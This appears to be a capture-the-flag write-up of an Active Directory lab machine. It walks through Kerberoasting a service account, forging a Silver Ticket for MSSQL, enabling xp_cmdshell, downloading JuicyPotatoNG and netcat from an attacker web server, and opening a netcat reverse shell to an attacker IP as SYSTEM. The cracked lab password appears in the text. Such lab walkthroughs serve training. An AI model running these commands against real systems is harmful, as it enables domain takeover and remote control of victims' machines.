Starting off with nmap, we get 14 ports open:

```sql
Nmap scan report for 10.129.249.66
Host is up (0.70s latency).
Not shown: 986 filtered tcp ports (no-response)
Bug in ms-sql-ntlm-info: no string output.
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Scramble Corp Intranet
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-13 07:48:24Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-09-04T11:14:45
| Not valid after:  2121-06-08T22:39:53
| MD5:   2ca2:5511:c96e:d5c5:3601:17f2:c316:7ea3
|_SHA-1: 9532:78bb:e082:70b2:5f2e:7467:6f7d:a61d:1918:685e
|_ssl-date: 2026-02-13T07:50:07+00:00; -1s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-09-04T11:14:45
| Not valid after:  2121-06-08T22:39:53
| MD5:   2ca2:5511:c96e:d5c5:3601:17f2:c316:7ea3
|_SHA-1: 9532:78bb:e082:70b2:5f2e:7467:6f7d:a61d:1918:685e
|_ssl-date: 2026-02-13T07:50:08+00:00; 0s from scanner time.
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.249.66:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-13T07:44:53
| Not valid after:  2056-02-13T07:44:53
| MD5:   1d2b:070e:b2e3:387d:1ec9:a7dc:e05d:9600
|_SHA-1: ff8f:1db3:134a:0c10:8633:1208:903f:c002:b68d:c15a
|_ssl-date: 2026-02-13T07:50:07+00:00; -1s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2026-02-13T07:50:08+00:00; -1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-09-04T11:14:45
| Not valid after:  2121-06-08T22:39:53
| MD5:   2ca2:5511:c96e:d5c5:3601:17f2:c316:7ea3
|_SHA-1: 9532:78bb:e082:70b2:5f2e:7467:6f7d:a61d:1918:685e
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2026-02-13T07:50:07+00:00; -1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-09-04T11:14:45
| Not valid after:  2121-06-08T22:39:53
| MD5:   2ca2:5511:c96e:d5c5:3601:17f2:c316:7ea3
|_SHA-1: 9532:78bb:e082:70b2:5f2e:7467:6f7d:a61d:1918:685e
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
```

So firstly we need to add 10.129.249.66 to our hosts files as DC1.scrm.local scrm.local scrm DC1 : 

``sudo echo '10.129.249.66 DC1.scrm.local scrm.local scrm DC1' >> /etc/hosts``

Usually, i like to start of with checking http (port 80) if open, which in this case is open and we see this :

<img width="1267" height="643" alt="Pasted image 20260213045730" src="https://github.com/user-attachments/assets/e814efda-7e09-4445-84ec-9a9abc6a5356" />


The Reports tab is the same page as this, so we are going to move on with 'IT Services':

<img width="968" height="551" alt="Pasted image 20260213045830" src="https://github.com/user-attachments/assets/33b2eb35-5cb4-470b-9ec9-fbdf30720657" />

We see a message about NTLM being disabled due to a security breach, which means we are going to be authenticating againist kerberos, going into the resources links we see : 

Link 1:

<img width="887" height="642" alt="Pasted image 20260213050028" src="https://github.com/user-attachments/assets/cc1c847d-394a-4107-ae2c-a4d36612b1a2" />

Take note of a possible user : ksimpson and user : support

Link 2 is about  creating a new user account, which doesn't really do anything since the website is static mostly.

<img width="851" height="645" alt="Pasted image 20260213050210" src="https://github.com/user-attachments/assets/d21a9ce2-7e76-4a3d-9b5e-0810443cd0e4" />

Link 3 is about reporting a problem through an app (not the path i m going to cover)

Link 4 

<img width="825" height="347" alt="Pasted image 20260213050333" src="https://github.com/user-attachments/assets/01f1d410-bae2-4d10-8b29-672c5a33a0a0" />

This is very interseting, this means we can try ksimpson as user and pass and it might work:

<img width="1081" height="73" alt="Pasted image 20260213050612" src="https://github.com/user-attachments/assets/961d92f3-c156-4816-8eea-659c5cca35ad" />

We authenticated, now let's try enumerating this Domain using these creds:

<img width="1256" height="392" alt="Pasted image 20260213051036" src="https://github.com/user-attachments/assets/df7a0f37-3d07-471a-9831-7fa959ea3b8b" />
<img width="1246" height="105" alt="Pasted image 20260213051053" src="https://github.com/user-attachments/assets/7ece54cd-ff99-4f77-879f-7351469430d4" />

let's keep the users in a users.txt incase we need them for something (no users have the same password as there username)

<img width="1263" height="512" alt="Pasted image 20260213051216" src="https://github.com/user-attachments/assets/6b813ab7-a506-4eae-92e9-1b04dd680b53" />

As part of enumeration, we see that we can request sqlsvc's hash to crack, this hash is mode 13100 in hashcat, so let's try to crack it:

<img width="852" height="428" alt="Pasted image 20260213051309" src="https://github.com/user-attachments/assets/fda5af24-3963-4843-91d7-c045425ed0ec" />

We get sqlsvc's password, which is crucial since we can request for alot of stuff now, but first, let's put them in a safe creds file :

```python
┌──(kali㉿kali)-[~/Desktop/htb/Scrambled2]
└─$ cat creds
sqlsvc / Pegasus60 / MSSQLSvc/dc1.scrm.local / b999a16500b87d17ec7f2e2a68778f05
ksimpson / ksimpson
```

So now we get to what maybe a new concept for alot of beginners, Forging Silver tickets, Golden tickets and the difference between Ticketer and TGT from impacket:

Silver tickets are mainly for service accounts, which in this case is sqlsvc, this will allow us to access MSSQL later on since we can't login with privileges if we don't create it. NOW, if it is done from impacket-getTGT , it's going to get authenticated from the DC, but if it is done but impacket-ticketer, we will need to convert the password to NT hash to forge a ticket of any user WITHOUT contacting the DC.
So Ticketer basicly fakes a ticket using the nt hash mainly.

Now that u have a basic idea, let's try forging using TGT (whcih is authenticated by the DC) and then try ticketer (which the fake ticket):

```python
┌──(kali㉿kali)-[~/Desktop/htb/Scrambled2]
└─$ impacket-getTGT -dc-ip 10.129.249.66 'scrm.local/sqlsvc' -k  
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Saving ticket in sqlsvc.ccache
                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/htb/Scrambled2]
└─$ export KRB5CCNAME=sqlsvc.ccache                          
                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/htb/Scrambled2]
└─$ impacket-mssqlclient -k dc1.scrm.local                       
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[-] ERROR(DC1): Line 1: Login failed for user 'SCRM\sqlsvc'.

┌──(kali㉿kali)-[~/Desktop/htb/Scrambled2]
└─$ impacket-mssqlclient -k DC1.scrm.local -windows-auth
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[-] ERROR(DC1): Line 1: Login failed for user 'SCRM\sqlsvc'.
                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/htb/Scrambled2]
└─$ impacket-mssqlclient -k DC1.scrm.local              
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[-] ERROR(DC1): Line 1: Login failed for user 'SCRM\sqlsvc'.
```

So as u can see, i purposefully tried everything to prove that it won't work that way.

So authentication is failing because sqlsvc is not allowed AS sqlsvc to login, so will need to fake an administrator ticket to get admin access to SQL:

```python
┌──(kali㉿kali)-[~/Desktop/htb/Scrambled2]
└─$ impacket-ticketer -nthash <convert Peaguess pass to NThash> -domain-sid <SID> -domain scrm.local -spn MSSQLSvc/dc1.scrm.local administrator

```

this is the syntax, let's now start working, to request a ticket, we need an SID, so let's work on that first. There is a tool called getPac by impacket, this gets a domain SID with ease and the command is as follows:

```python
┌──(kali㉿kali)-[~/Desktop/htb/Scrambled2]
└─$ impacket-getPac -targetUser administrator scrm.local/sqlsvc:Pegasus60
```
user ```ksimpson:ksimpson``` also works. now we get the result:

```python
┌──(kali㉿kali)-[~/Desktop/htb/Scrambled2]
└─$ impacket-getPac -targetUser administrator scrm.local/sqlsvc:Pegasus60 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

KERB_VALIDATION_INFO 
LogonTime:                      
    dwLowDateTime:                   2914352405 
    dwHighDateTime:                  31235260 
LogoffTime:                     
    dwLowDateTime:                   4294967295 
    dwHighDateTime:                  2147483647 
KickOffTime:                    
    dwLowDateTime:                   4294967295 
    dwHighDateTime:                  2147483647
    
    <SNIP>
    
         
        RelativeId:                      572 
        Attributes:                      536870919 ,
    ] 
Domain SID: S-1-5-21-2743207045-1827831105-2542523200

 0000   10 00 00 00 A2 30 B9 03  4F BA 9B F3 CF 13 19 DF   .....0..O.......
```

so now that we have the sid, we can work on convertting  'Pegasus60' to NT, and by a very simple search we get alot of result to help us do so, a link can be the following:

https://www.browserling.com/tools/ntlm-hash

now we enter the password;

<img width="852" height="428" alt="Pasted image 20260213051309" src="https://github.com/user-attachments/assets/95d1001c-23b0-480f-be6f-ecc75575a735" />

Pressing on 'Calculate NTLM Hash' gives the hash:

<img width="483" height="466" alt="Pasted image 20260213054538" src="https://github.com/user-attachments/assets/ca5d7ffb-311c-4268-a274-004d10ab1c01" />

NOW, AN IMPORTANT NOTE, NT hashes are not recommended if UPPERCASE, so we will need to make the hash lowercase from cyberchef and draging the lowercase into the decryption (Thhis doesn't necessarily need to be done by cyberchef):

<img width="1027" height="379" alt="Pasted image 20260213054849" src="https://github.com/user-attachments/assets/8163c874-d651-49e5-83b6-4837c62c2dac" />

now we can request the ticket with now problems (hopefully):
```r
┌──(kali㉿kali)-[~/Desktop/htb/Scrambled2]
└─$ impacket-ticketer -nthash B999A16500B87D17EC7F2E2A68778F05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -spn MSSQLSvc/dc1.scrm.local administrator
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for scrm.local/administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in administrator.ccache
```

we got the administrator ccache file, now we first need to export then we can auth as admin into mssql:

<img width="659" height="404" alt="Pasted image 20260213055055" src="https://github.com/user-attachments/assets/72f9f705-f81c-4c85-963c-e0cf907d4484" />

now we should enable_xp_cmdshell, since it's not ON automaticlly:

```bash
SQL (SCRM\administrator  dbo@master)> xp_cmdshell

ERROR(DC1): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.

SQL (SCRM\administrator  dbo@master)> enable_xp_cmdshell
INFO(DC1): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC1): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (SCRM\administrator  dbo@master)> xp_cmdshell whoami
output        
-----------   
scrm\sqlsvc   
NULL          

```

now, from here can execute commands from MSSQL, so let's enumerate privs to check what we have:

```sql
SQL (-@master)> xp_cmdshell whoami /priv
output                                                                             
--------------------------------------------------------------------------------   
NULL                                                                               
PRIVILEGES INFORMATION                                                             
----------------------                                                             
NULL                                                                               
Privilege Name                Description                               State      
============================= ========================================= ========   
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeMachineAccountPrivilege     Add workstations to domain                Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
NULL                                                                               
SQL (SCRM\administrator  dbo@master)>
```

WE HAVE SeImpersonatePrivilege So Automatically, we must try the RoguePotato or JuicyPotota Attacks. for my case, i will download  JuicyPotatoNG.exe and NC64.exe from the following links :

Netcat : https://github.com/int0x33/nc.exe/blob/master/nc64.exe
JuicyPotatoNG.exe : https://github.com/antonioCoco/JuicyPotatoNG/releases/tag/v1.1   (extract from zip file)
SeImpersonation attacks in General to read:  https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/
- another one: https://conference.hitb.org/hitbsecconf2021ams/materials/D2T1%20-%20The%20Rise%20of%20Potatoes%20-%20Privilege%20Escalation%20in%20Windows%20Services%20-%20Andrea%20Pierini%20&%20Antonio%20Cocomazzi.pdf
- another one: https://steflan-security.com/linux-privilege-escalation-token-impersonation/

now we transfer them from out attacker using python3 -m http.server 80 to the victim, and put them in the \programdata directory, since it is a read/write directory:

```sql
SQL (SCRM\administrator  dbo@master)> xp_cmdshell curl YourIP/JuicyPotatoNG.exe -o C:\programdata\JuicyPotatoNG.exe
output                                                                             
--------------------------------------------------------------------------------   
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current    
                                 Dload  Upload   Total   Spent    Left  Speed      
100  150k  100  1       0     0  23674      0  0:00:06  0:00:02  0:00:04 23683
50k    0     0  58951      0  0:00:02  0:00:02 --:--:-- 58963                      
NULL 

(SCRM\administrator  dbo@master)> xp_cmdshell curl <YourIP>/nc64.exe -o C:\programdata\nc64.exe
output                                                                             
--------------------------------------------------------------------------------   
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current    
                                 Dload  Upload   Total   Spent    Left  Speed      
100 45272  100 45       0     0  20191      0  0:00:02  0:00:01  0:00:01 20193
272    0     0  19970      0  0:00:02  0:00:02 --:--:-- 19978                      
NULL                                                                               
SQL (SCRM\administrator  dbo@master)>
```

From here, it's game over, take note of the following command incase you see JuicyPotato again:

Start a listener in attacker :

```sql
┌──(kali㉿kali)-[~/Desktop/htb/Scrambled2]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
```

and run this command (take note):

```sql
SQL (SCRM\administrator  dbo@master)> xp_cmdshell c:\programdata\JuicyPotatoNG.exe -t * -p c:\programdata\nc64.exe -a "10.10.16.62 1234 -e c:\windows\system32\cmd.exe"

```

now we get a shell on our listener as NT Authortiy:

```
┌──(kali㉿kali)-[~/Desktop/htb/Scrambled2]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.16.62] from (UNKNOWN) [10.129.249.66] 58568
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>whoami
whoami
nt authority\system

C:\>
```

Confirming we are admin from whoami /all or /priv :
(We are indeed):

```python
C:\Users\miscsvc\Desktop>whoami /all      
whoami /all

USER INFORMATION
----------------

User Name           SID     
=================== ========
nt authority\system S-1-5-18


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner    
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
Mandatory Label\System Mandatory Level Label            S-1-16-16384                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State  
========================================= ================================================================== =======
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Enabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeAuditPrivilege                          Generate security audits                                           Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

Then we claim the root flag from \users\administrators\Desktop\root.txt
and the user flag from \users\miscsvc\Desktop\user.txt

``` python
C:\Users\administrator\Desktop>dir

 Directory of C:\Users\administrator\Desktop

29/05/2022  20:02    <DIR>          .
29/05/2022  20:02    <DIR>          ..
13/02/2026  07:45                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)  15,989,252,096 bytes free

C:\Users\administrator\Desktop>type root.txt
type root.txt
bfb78d2<SNIP>

C:\Users\administrator\Desktop>cd ../../Miscsvc
cd ../../Miscsvc

C:\Users\miscsvc>cd Desktop
cd Desktop

C:\Users\miscsvc\Desktop>type user.txt
type user.txt
5fa20<SNIP> 
```

